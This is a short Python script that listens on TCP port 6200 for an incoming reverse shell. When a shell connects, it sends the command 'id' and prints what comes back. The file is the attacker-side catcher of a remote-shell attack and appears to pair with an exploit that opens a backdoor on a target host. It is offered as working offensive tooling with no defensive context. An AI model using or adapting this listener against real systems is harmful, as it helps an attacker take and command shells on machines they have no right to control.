import socket

LISTEN_PORT = 6200
TIMEOUT = 30  # seconds

def listen_for_shell():
    print(f"[*] Listening on port {LISTEN_PORT} for reverse shell... (timeout: {TIMEOUT}s)")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", LISTEN_PORT))
    s.listen(1)
    s.settimeout(TIMEOUT)

    try:
        conn, addr = s.accept()
        print(f"[+] Reverse shell connected from {addr[0]}:{addr[1]}")
        try:
            conn.send(b"id\n")
            result = conn.recv(1024).decode(errors="ignore").strip()
            print(f"[+] Shell response: {result}")
        except Exception as e:
            print("[-] Could not interact with shell:", e)
        conn.close()
    except socket.timeout:
        print("[-] No shell received within timeout.")
    finally:
        s.close()

if __name__ == "__main__":
    listen_for_shell()
